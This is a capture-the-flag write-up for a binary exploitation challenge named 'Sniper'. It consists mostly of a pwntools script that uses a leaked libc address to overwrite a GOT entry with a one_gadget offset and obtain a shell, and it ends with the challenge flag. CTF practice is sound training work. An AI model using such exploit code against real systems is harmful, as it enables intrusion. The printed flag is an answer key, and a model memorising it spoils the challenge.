# Sniper

[one_gadget](https://github.com/david942j/one_gadget) is a great tool for finding sequences of instructions that will give you a free shell. Try using it to pwn this binary!

Author: Nathan

## Solution

```python
from pwn import *

libc = ELF('./libc.so.6')
pwn = ELF('./sniper')
p = remote('127.0.0.1', 1341)
#p = process('./sniper')

puts = libc.sym['puts']
GOT = pwn.got['puts']
og = 0x4497f

p.recvline()
addr = int(p.recvline().decode('utf-8').split(' ')[-1], 16)

libc_base = addr - puts

p.recvuntil(b'\n')
p.sendline(str(GOT).encode())
p.recvuntil(b'\n')
p.sendline(str(libc_base+og).encode())
p.interactive()
```

flag:
`gigem{one_shot_one_kill_poggers}`
